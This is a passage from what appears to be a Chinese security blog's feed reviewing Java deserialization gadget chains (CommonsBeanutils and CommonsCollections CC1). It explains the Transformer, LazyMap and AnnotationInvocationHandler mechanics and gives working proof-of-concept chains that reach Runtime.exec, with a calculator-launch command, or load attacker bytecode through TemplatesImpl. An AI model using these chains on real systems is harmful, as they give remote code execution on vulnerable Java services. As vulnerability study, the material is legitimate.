class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> templates;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>不依赖CommonsCollections</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example.deserialize.commonsbeanutils;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.BeanComparator;</span><br><span class="line"><span class="keyword">import</span> org.example.deserialize.commonscollections.Evil;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> java.lang.String.CASE_INSENSITIVE_ORDER;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsBeanutilsNoCC</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        PriorityQueue&lt;Object&gt; queue = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;(<span class="number">2</span>);</span><br><span class="line">        queue.add(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">        queue.add(<span class="string">&quot;1&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> PriorityQueue.class.getDeclaredField(<span class="string">&quot;queue&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        Object[] objects = (Object[]) field.get(queue);</span><br><span class="line">        objects[<span class="number">0</span>] = getTemplates();</span><br><span class="line"></span><br><span class="line">        BeanComparator&lt;Object&gt; beanComparator = <span class="keyword">new</span> <span class="title class_">BeanComparator</span>&lt;&gt;(<span class="string">&quot;outputProperties&quot;</span>, CASE_INSENSITIVE_ORDER);</span><br><span class="line">        setFieldValue(queue, <span class="string">&quot;comparator&quot;</span>, beanComparator);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">            outputStream.writeObject(queue);</span><br><span class="line">            outputStream.flush();</span><br><span class="line">            outputStream.close();</span><br><span class="line"></span><br><span class="line">            <span class="type">ByteArrayInputStream</span> <span class="variable">byteArrayInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(byteArrayOutputStream.toByteArray());</span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(byteArrayInputStream);</span><br><span class="line">            inputStream.readObject();</span><br><span class="line">            inputStream.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj,value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Templates <span class="title function_">getTemplates</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">clazz</span> <span class="operator">=</span> pool.get(Evil.class.getName());</span><br><span class="line">        <span class="type">byte</span>[] code = clazz.toBytecode();</span><br><span class="line"></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][] &#123;code&#125;);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;Evil&quot;</span>);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> templates;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> 反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CommonsCollections</title>
      <link href="/2023/04/23/CommonsCollections/"/>
      <url>/2023/04/23/CommonsCollections/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><a href="https://commons.apache.org/proper/commons-collections/">Apache Commons Collections</a>是一个扩展了Java标准库里的Collection结构的第三方基础库，它提供了很多强有力的数据结构类型并实现了各种集合工具类。</p><p>本文参考su18师傅的文章简略的复习了一下CC链，对于文章中的LazyMap，也可以替换成DefaultedMap来进行实现，这里贴一张最初学CC链的时候做的总结图。</p><p><img src="/2023/04/23/CommonsCollections/1709216990055-f6cb655a-6eb3-47e7-9138-cd0b6517e14b.png"></p><p>依赖版本为commons-collections 3.1（CC1&#x2F;CC7）、commons-collections 3.1-3.2.1（CC3&#x2F;CC5&#x2F;CC6）和commons-collections4 4.0（CC2&#x2F;CC4）。</p><h2 id="CommonsCollections1"><a href="#CommonsCollections1" class="headerlink" title="CommonsCollections1"></a>CommonsCollections1</h2><h3 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h3><h4 id="AbstractMapDecorator"><a href="#AbstractMapDecorator" class="headerlink" title="AbstractMapDecorator"></a>AbstractMapDecorator</h4><p>CommonsCollections库中提供了一个抽象类org.apache.commons.collections.map.AbstractMapDecorator，这个类是Map的扩展，作为一个基础的装饰器，用来给Map提供附加功能，被装饰的Map存在该类的属性中，并且将所有的操作都转发给这个Map。</p><p><img src="/2023/04/23/CommonsCollections/1707409626415-f84e5c1d-01d8-47a3-b85a-9a6eda2cac05.png"></p><h5 id="TransformedMap"><a href="#TransformedMap" class="headerlink" title="TransformedMap"></a><font style="color:#080808;background-color:#ffffff;">TransformedMap</font></h5><p>在org.apache.commons.collections.map.TransformedMap类中，当一个元素被加入到集合内时，会依据Transformer对该元素进行特定的修饰变换，也就是说当TransformedMap内的key或者value发生变化时，就会触发相应参数的Transformer的transform方法。</p><p><img src="/2023/04/23/CommonsCollections/1707449409899-b4e20316-3fa1-465e-b384-32d5d254897a.png"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example.deserialize.demo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TransformedMapTest</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">Transformer</span> <span class="variable">keyTransformer</span> <span class="operator">=</span> input -&gt; &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">num</span> <span class="operator">=</span> (<span class="type">int</span>) input;</span><br><span class="line">        num += <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">return</span> (Object) num;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">Transformer</span> <span class="variable">valueTransformer</span> <span class="operator">=</span> input -&gt; &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">string</span> <span class="operator">=</span> input.toString();</span><br><span class="line">        <span class="keyword">return</span> string + <span class="string">&quot;!&quot;</span>;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(<span class="number">1</span>, <span class="string">&quot;a&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;1. Map: &quot;</span> + hashMap);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> TransformedMap.decorate(hashMap, keyTransformer, valueTransformer);</span><br><span class="line">        map.put(<span class="number">1</span>, <span class="string">&quot;b&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;2. Map: &quot;</span> + map);</span><br><span class="line"></span><br><span class="line">        map.put(<span class="number">2</span>, <span class="string">&quot;c&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;3. Map: &quot;</span> + map);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/2023/04/23/CommonsCollections/1707449334221-08afd718-f87f-4485-8bfa-6a8b6f4630b0.png"></p><h5 id="LazyMap"><a href="#LazyMap" class="headerlink" title="LazyMap"></a><font style="color:#080808;background-color:#ffffff;">LazyMap</font></h5><p>与org.apache.commons.collections.map.TransformedMap类似，org.apache.commons.collections.map.LazyMap在调用get方法时，如果传入的key不存在，则会触发相应参数的Transformer的transform方法。</p><p><img src="/2023/04/23/CommonsCollections/1707449548989-f2f5a3b9-0cc0-401e-ba0a-0ba8b8ccb3a1.png"></p><h5 id="DefaultedMap"><a href="#DefaultedMap" class="headerlink" title="DefaultedMap"></a>DefaultedMap</h5><p>org.apache.commons.collections.map.DefaultedMap中的get方法同样会触发transform方法。</p><p><img src="/2023/04/23/CommonsCollections/1707450589927-f173b352-1445-4388-af0e-745c055ec3bb.png"></p><h4 id="Transform"><a href="#Transform" class="headerlink" title="Transform"></a>Transform</h4><p>org.apache.commons.collections.Transformer接口中提供了一个transform方法，用来定义具体的转换逻辑。该方法接收Object类型的输入，返回处理后的Object对象。</p><p>利用Transformer的实现类，可以实现对不同的TransformedMap中key&#x2F;value进行修改的功能。</p><p><img src="/2023/04/23/CommonsCollections/1707531271404-2123f195-eb3a-41ea-b11e-0ab1073e7b16.png"></p><h5 id="ChainedTransformer"><a href="#ChainedTransformer" class="headerlink" title="ChainedTransformer"></a>ChainedTransformer</h5><p>org.apache.commons.collections.functors.ChainedTransformer类维护了一个Transformer数组，在调用ChainedTransformer#transform方法时，会循环数组，依次调用Transformer数组中每个Transformer的transform方法，并将结果传递给下一个Transformer。利用该特性，可以链式调用多个Transformer分别处理对象。</p><p><img src="/2023/04/23/CommonsCollections/1707664550539-8861da13-52c2-4d4e-bd5e-b0470b1a04ba.png"></p><h5 id="InvokerTransformer"><a href="#InvokerTransformer" class="headerlink" title="InvokerTransformer"></a>InvokerTransformer</h5><p>org.apache.commons.collections.functors.InvokerTransformer类使用反射创建一个新对象，通过调用input的方法，并将方法返回结果作为处理结果进行返回，可以利用InvokerTransformer来执行命令。</p><p><img src="/2023/04/23/CommonsCollections/1707665617135-56cbf123-40ad-4519-8fd6-53f51906c274.png"></p><h5 id="ConstantTransformer"><a href="#ConstantTransformer" class="headerlink" title="ConstantTransformer"></a>ConstantTransformer</h5><p>org.apache.commons.collections.functors.ConstantTransformer类在初始化时储存了一个Object，后续的调用时会直接返回这个Object。这个类用于和ChainedTransformer配合，将其结果传入InvokerTransformer来调用指定的类的指定方法。</p><p><img src="/2023/04/23/CommonsCollections/1707666815343-9c915b17-be6d-46ae-9749-4b85f1e15f90.png"></p><h3 id="利用构造"><a href="#利用构造" class="headerlink" title="利用构造"></a>利用构造</h3><p>利用ConstantTransformer返回Runtime的Class对象，并传入InvokerTransformer中，借助ChainedTransformer的链式调用方式完成反射的调用，执行恶意代码。</p><p>接下来需要寻找反序列化的触发点，这里选取的是sun.reflect.annotation.AnnotationInvocationHandler，这个类实现了InvocationHandler接口，原本是用于JDK对于注解形式的动态代理。</p><p>在构造方法中接收两个参数，第一个参数是Annotation实现类的Class对象，第二个参数是是一个&lt;String, Object&gt;类型的Map。</p><p><img src="/2023/04/23/CommonsCollections/1707670276318-0c7dae5e-84c5-42f1-b3d2-3722eb43fe55.png"></p><p>在AnnotationInvocationHandler#readObject方法中，调用AnnotationType.getInstance(this.type)来获取type这个注解类对应的AnnotationType的对象，然后获取其memberTypes属性，这个属性为Map，存放这个注解中可以配置的值。然后循环这个Map来获取其key，如果注解类的memberTypes属性中存在与this.memberValues的key相同的属性，并且取得的值不是ExceptionProxy的实例也不是memberValues中值的实例，则取得其值，并调用setValue方法写入值。</p><p><img src="/2023/04/23/CommonsCollections/1707672686713-001e23ca-7cac-4789-8eda-bb623e508286.png"></p><p>接着会调用AbstractInputCheckedMapDecorator类中静态类MapEntry的setValue方法，进而调用到TransformedMap#checkSetValue方法，从而触发transform方法。</p><p><img src="/2023/04/23/CommonsCollections/1708881154002-87eaceb4-c168-4114-b8c9-f068dc4702c7.png"></p><p>构造payload思路：<br>    - 构造一个AnnotationInvocationHandler实例，初始化阶段传入一个注解类和一个Map，这个Map的key中要有注解类中存在的属性，但是值不是对应的实例，也不是ExceptionProxy对象。<br>    - 这个Map由TransformedMap封装，并调用自定义的ChainedTransformer进行装饰。<br>    - ChainedTransformer中写入多个Transformer实现类，用于链式调用，完成恶意代码执行。</p><p>当然也可以用LazyMap来替换TransformedMap，当get方法获取不到key时，LazyMap会触发Transform，由于被动态代理的对象调用任意方法都会调用对应的InvocationHandler的invoke方法，并且AnnotationInvocationHandler的invoke方法可以触发memberValues的get方法。</p><p><img src="/2023/04/23/CommonsCollections/1707674438025-abf40af9-f88d-4223-85b3-69ef34089489.png"></p><p>那么<font style="color:rgb(0, 0, 0);">构造思路就变成了，使用带有装饰器的</font><font style="color:rgb(0, 0, 0);">LazyMap</font><font style="color:rgb(0, 0, 0);">初始化</font><font style="color:rgb(0, 0, 0);">AnnotationInvocationHandler</font><font style="color:rgb(0, 0, 0);">之前，先使用</font><font style="color:rgb(0, 0, 0);">InvocationHandler</font><font style="color:rgb(0, 0, 0);">代理一下</font><font style="color:rgb(0, 0, 0);">LazyMap</font><font style="color:rgb(0, 0, 0);">，这样反序列化</font><font style="color:rgb(0, 0, 0);">AnnotationInvocationHandler</font><font style="color:rgb(0, 0, 0);">时，调用</font><font style="color:rgb(0, 0, 0);">LazyMap</font><font style="color:rgb(0, 0, 0);">值的</font><font style="color:rgb(0, 0, 0);">setValue</font><font style="color:rgb(0, 0, 0);">方法之前会调用代理类的</font><font style="color:rgb(0, 0, 0);">invoke</font><font style="color:rgb(0, 0, 0);">方法，从而触发</font><font style="color:rgb(0, 0, 0);">LazyMap</font><font style="color:rgb(0, 0, 0);">的</font><font style="color:rgb(0, 0, 0);">get</font><font style="color:rgb(0, 0, 0);">方法。</font></p><h3 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example.deserialize.commonscollections;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Repeatable;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsCollections1</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">CommonsCollections1</span> <span class="variable">commonsCollections1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CommonsCollections1</span>();</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">transformedMapChain</span> <span class="operator">=</span> commonsCollections1.TransformedMapChain();</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">lazyMapChain</span> <span class="operator">=</span> commonsCollections1.LazyMapChain();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">            outputStream.writeObject(lazyMapChain);</span><br><span class="line">            outputStream.flush();</span><br><span class="line">            outputStream.close();</span><br><span class="line"></span><br><span class="line">            <span class="type">ByteArrayInputStream</span> <span class="variable">byteArrayInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(byteArrayOutputStream.toByteArray());</span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(byteArrayInputStream);</span><br><span class="line">            inputStream.readObject();</span><br><span class="line">            inputStream.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> InvocationHandler <span class="title function_">TransformedMapChain</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(<span class="string">&quot;value&quot;</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;open -a Calculator&quot;</span>&#125;)</span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> TransformedMap.decorate(hashMap, <span class="literal">null</span>, chainedTransformer);</span><br><span class="line"></span><br><span class="line">        Class&lt;?&gt; annotationInvocationHandlerClass = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        Constructor&lt;?&gt; constructor = annotationInvocationHandlerClass.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">invocationHandler</span> <span class="operator">=</span> (InvocationHandler) constructor.newInstance(Repeatable.class, map);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> invocationHandler;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> InvocationHandler <span class="title function_">LazyMapChain</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(<span class="string">&quot;value&quot;</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;open -a Calculator&quot;</span>&#125;)</span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> LazyMap.decorate(hashMap, chainedTransformer);</span><br><span class="line"></span><br><span class="line">        Class&lt;?&gt; annotationInvocationHandlerClass = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        Constructor&lt;?&gt; constructor = annotationInvocationHandlerClass.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> (InvocationHandler) constructor.newInstance(Repeatable.class, map);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">proxyMap</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), <span class="keyword">new</span> 